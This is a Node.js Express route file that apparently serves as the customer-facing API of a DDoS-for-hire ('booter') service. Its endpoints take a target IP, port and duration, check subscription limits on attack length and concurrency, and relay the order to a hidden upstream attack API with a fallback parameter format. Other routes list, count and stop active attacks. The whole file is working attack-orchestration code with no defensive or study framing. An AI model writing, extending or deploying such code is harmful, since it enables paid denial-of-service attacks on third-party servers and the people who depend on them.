// routes/apiExternal.js - FINAL WORKING VERSION
const express = require('express');
const router = express.Router();
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const { authenticateApiUser } = require('../middleware/apiAuthMiddleware');
const ApiUser = require('../models/ApiUser');

router.use(authenticateApiUser);

// Attack endpoint
router.post('/attack', async (req, res) => {
    const { ip, port, duration } = req.body;
    const apiUser = req.apiUser;

    if (apiUser.isExpired()) {
        return res.status(403).json({ 
            error: 'Account has expired',
            expiresAt: apiUser.expiresAt,
            daysRemaining: 0
        });
    }
    
    // Validation
    if (!ip || !port || !duration) {
        return res.status(400).json({ error: 'Missing required fields' });
    }
    
    const portNum = parseInt(port);
    const durationSec = parseInt(duration);
    
    if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
        return res.status(400).json({ error: 'Invalid port' });
    }
    
    if (isNaN(durationSec) || durationSec < 1) {
        return res.status(400).json({ error: 'Invalid duration' });
    }
    
    // Check max duration limit
    if (durationSec > apiUser.limits.maxDuration) {
        return res.status(403).json({ error: `Duration exceeds limit (max: ${apiUser.limits.maxDuration}s)` });
    }
    
    // FIXED: Clean expired attacks and get accurate count
    const currentActive = await apiUser.getActiveCount();
    
    // Check concurrent limit
    if (currentActive >= apiUser.limits.maxConcurrent) {
        return res.status(429).json({
            error: `Max concurrent attacks reached (${apiUser.limits.maxConcurrent})`,
            currentActive,
            maxConcurrent: apiUser.limits.maxConcurrent
        });
    }
    
    const attackId = uuidv4();
    
    // Call external API (silently, no response to client)
    try {
        const externalApiUrl = process.env.API_URL;
        const externalApiKey = process.env.API_KEY;
        
        if (!externalApiUrl) {
            return res.status(500).json({ error: 'Service temporarily unavailable' });
        }
        
        // Call external API - don't send response to client
        try {
            await axios.post(externalApiUrl, {
                ip, port: portNum, duration: durationSec, attackId
            }, {
                headers: { 'x-api-key': externalApiKey, 'Content-Type': 'application/json' },
                timeout: 10000
            });
        } catch {
            // Try alternative format
            await axios.post(externalApiUrl, {
                param1: ip, param2: portNum, param3: durationSec, attackId
            }, {
                headers: { 'x-api-key': externalApiKey, 'Content-Type': 'application/json' },
                timeout: 10000
            });
        }
        
        // Track the attack
        await apiUser.addActiveAttack(attackId, ip, portNum, durationSec);
        apiUser.totalRequests++;
        await apiUser.save();
        
        // Auto cleanup after duration
        setTimeout(async () => {
            try {
                const freshUser = await ApiUser.findById(apiUser._id);
                if (freshUser) {
                    await freshUser.removeActiveAttack(attackId);
                }
            } catch (err) {
                // Silent cleanup
            }
        }, durationSec * 1000);
        
        // Get updated count
        const newActiveCount = await apiUser.getActiveCount();
        
        res.json({
            success: true,
            attack: {
                id: attackId,
                target: ip,
                port: portNum,
                duration: durationSec,
                endsAt: new Date(Date.now() + durationSec * 1000).toISOString()
            },
            limits: {
                maxConcurrent: apiUser.limits.maxConcurrent,
                maxDuration: apiUser.limits.maxDuration,
                currentActive: newActiveCount,
                remainingSlots: apiUser.limits.maxConcurrent - newActiveCount
            }
        });
        
    } catch (error) {
        // Cleanup if attack was added
        await apiUser.removeActiveAttack(attackId).catch(() => {});
        res.status(500).json({ error: 'Failed to launch attack' });
    }
});

// Get active attacks
router.get('/active', async (req, res) => {
    const apiUser = req.apiUser;
    const activeCount = await apiUser.getActiveCount();
    
    res.json({
        activeAttacks: apiUser.activeAttacks.map(a => ({
            attackId: a.attackId,
            target: a.target,
            port: a.port,
            expiresIn: Math.max(0, Math.floor((a.expiresAt - Date.now()) / 1000))
        })),
        count: activeCount,
        maxConcurrent: apiUser.limits.maxConcurrent,
        remainingSlots: apiUser.limits.maxConcurrent - activeCount
    });
});

// Get user stats
router.get('/stats', async (req, res) => {
    const apiUser = req.apiUser;
    const activeCount = await apiUser.getActiveCount();
    
    res.json({
        username: apiUser.username,
        status: apiUser.status,
        limits: apiUser.limits,
        stats: {
            totalAttacks: apiUser.totalAttacks,
            totalRequests: apiUser.totalRequests,
            currentActiveAttacks: activeCount,
            remainingSlots: apiUser.limits.maxConcurrent - activeCount
        }
    });
});

// Stop an attack
router.post('/stop-attack', async (req, res) => {
    const { attackId } = req.body;
    const apiUser = req.apiUser;
    
    if (!attackId) {
        return res.status(400).json({ error: 'attackId required' });
    }
    
    const attack = apiUser.activeAttacks.find(a => a.attackId === attackId);
    if (!attack) {
        return res.status(404).json({ error: 'Attack not found' });
    }
    
    await apiUser.removeActiveAttack(attackId);
    res.json({ success: true });
});

// Health check
router.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

module.exports = router;